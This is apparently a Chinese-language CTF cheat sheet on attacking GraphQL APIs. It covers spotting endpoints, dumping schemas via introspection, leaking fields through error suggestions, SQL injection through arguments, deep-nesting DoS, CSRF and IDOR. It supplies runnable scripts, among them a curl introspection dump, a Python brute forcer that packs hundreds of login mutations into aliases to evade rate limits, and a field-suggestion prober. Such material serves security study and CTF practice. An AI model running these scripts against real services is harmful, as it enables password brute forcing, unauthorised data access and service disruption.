---
title: GraphQL 攻击（introspection、别名批量绕过限流、字段建议泄露、注入）
category: web
tags: [graphql, introspection, 限流绕过, api, injection]
signals:
  - "完整路径只有 /graphql，且所有请求都是 POST JSON"
  - "报错内容为 Cannot query field 并附带 Did you mean"
  - "响应 JSON 里有 errors[0].message 与 locations 字段"
  - "前端 JS bundle 里出现 __schema 或 gql 模板串"
  - "GET /graphql?query={__typename} 返回 Query 类型名"
  - "有 /graphiql 或 /playground 可视化调试页面"
  - "登录 mutation 可以一次提交上百个对象"
  - "响应里带 extensions.tracing 说明开了 Apollo 插件"
  - "题面提示词出现 GraphQL / 接口 / API / 内省"
difficulty: medium
source: "PortSwigger / OWASP Cheat Sheet / HackTricks"
tools: [python, graphql-cop, burpsuite]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- POST `/graphql`，body 是 `{"query": "..."}`；`GET /graphql?query={__typename}` 返回 `"data":{"__typename":"Query"}`。
- 前端 bundle 里出现 `gql\`query`、`__schema`、`ApolloClient`、`graphql`。
- 任意拼错字段名返回：`Cannot query field "user" on type "Query". Did you mean "users"?` —— **字段建议泄露**。
- 响应 `{"errors":[{"message":...,"locations":...}]}`。
- 题面提示：`接口`、`API`、`GraphQL`、`内省`、`绕过限流`、`越权`。
- 有 `/graphiql`、`/playground`、`/altair`、`/graphql/console` 可视化页面。

## 二、原理

### 1. Introspection：把整个 schema 扒下来

GraphQL 天生自描述，`__schema` 返回所有类型、字段、参数、枚举、描述（描述里有时藏着凭据）。关闭 introspection 也常留下 **`__type`** 或 **字段建议** 泄漏。

### 2. 别名（Aliases）绕过限流

```graphql
mutation {
  a1: login(input:{username:"u1",password:"p1"}){token}
  a2: login(input:{username:"u2",password:"p2"}){token}
  ...
  a1000: login(input:{username:"u1000",password:"p1000"}){token}
}
```

一个 HTTP 请求里塞 1000 个别名 → 限流器只算"1 次请求" → 密码爆破。

### 3. 字段建议（Field Suggestions）

introspection 被关时，故意拼错字段名，服务端返回 `Did you mean X?`，可以**一节一节地把 schema 猜回来**。

### 4. 注入面

- 参数透传到 SQL（`users(filter:"' OR 1=1--")`）
- 透传到 NoSQL
- **GraphQL 深度嵌套 DoS**（`user{posts{comments{author{posts{...}}}}}`）
- **Batched queries**：body 为数组 `[{query:..},{query:..}]`

## 三、解题步骤

1. **确认端点**：`POST /graphql {"query":"{__typename}"}`；试 `/api/graphql`、`/v1/graphql`、`/graphql/`。
2. **拉 schema**：用标准 introspection 查询（下面脚本），或直接 `graphql-cop -t URL`。
3. **找敏感字段**：`password`、`token`、`apiKey`、`role`、`secret`、`internal`、`debug`。
4. **越权**：把 `me` 改成 `user(id:1)`，看是否没鉴权。
5. **批量绕过**：构造 1000 别名爆破登录。
6. **注**：在参数里塞单引号，看是否 500 + 原始 SQL 报错。
7. **深度 DoS**：确认影响范围（CTF 里慎用）。

## 四、可直接运行的脚本

完整 introspection 查询（一次拉全 schema）：

```bash
curl -s -X POST http://TARGET/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } }"}' | python -m json.tool
```

别名批量爆破登录（100 次密码 × 1 请求）：

```python
import json, requests

URL = "http://TARGET/graphql"

def build(users_passwords, batch=100):
    fields = []
    for i, (u, p) in enumerate(users_passwords):
        fields.append(
            'a%d: login(input:{username:"%s",password:"%s"}){token msg}'
            % (i, u, p)
        )
    return "mutation{" + " ".join(fields) + "}"

pairs = [(u, p) for u in ["admin"] for p in open("pass.txt").read().split()]

for i in range(0, len(pairs), 100):
    chunk = pairs[i:i+100]
    r = requests.post(URL, json={"query": build(chunk)}, timeout=30)
    data = r.json().get("data") or {}
    for k, v in data.items():
        if v and v.get("token"):
            print("HIT", k, v["token"]); raise SystemExit
print("no hit")
```

字段建议泄露，猜 schema：

```python
import requests, re

URL = "http://TARGET/graphql"
probe = ["{ usr }", "{ user { id } }", "{ users { id } }", "{ admn }"]
for q in probe:
    r = requests.post(URL, json={"query": q}, timeout=10)
    msg = " ".join(e.get("message", "") for e in r.json().get("errors", []))
    print(q, "=>", msg)
    m = re.search(r'Did you mean "?([A-Za-z_]+)"?', msg)
    if m:
        print("  suggestion:", m.group(1))
```

深度 DoS 探针（仅测一层，勿真打）：

```graphql
query Q { user { posts { comments { author { posts { comments { id } } } } } } }
```

## 五、常见坑 / 变体

- **introspection 被禁**：`__schema` 报 `GraphQL introspection is not allowed`；改用 `__type(name:"Query")`，或走字段建议。
- **`__typename` 也被禁**：用合法字段（`{ user(id:1){ id } }`）测试存在性。
- **别名有上限**（某些网关 50/100）：分批；或拆成 `[{"query":..},{"query":..}]`（batched）。
- **CSRF**：`Content-Type: application/json` 会被预检拦，但很多服务器接受 `query=...` 表单 POST → 可 CSRF。
- **IDOR 常藏在 mutation 的 `input.id`**，不是 query。
- **变体：Apollo 的 `APQ`（Automated Persisted Queries）** → `extensions.persistedQuery` 可被投毒。
- **变体：`@include`/`@skip` 指令配合分支** 隐藏解析差异。
- **变体：GraphQL 拼接 SQL** → `users(filter: "1=1")`。
- **变体：`__proto__` 污染**（Node GraphQL 后端）→ 见 `nodejs-prototype-pollution.md`。

## 六、参考来源

- [PortSwigger — GraphQL API vulnerabilities](https://portswigger.net/web-security/graphql)
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [HackTricks — GraphQL](https://book.hacktricks.wiki/en/pentesting-web/graphql.html)
- [GraphQL 官方文档 — Introspection](https://graphql.org/learn/introspection/)
- [graphql-cop](https://github.com/dolevf/graphql-cop)
- [GraphQL 官方文档 — Introspection](https://graphql.org/learn/introspection/)
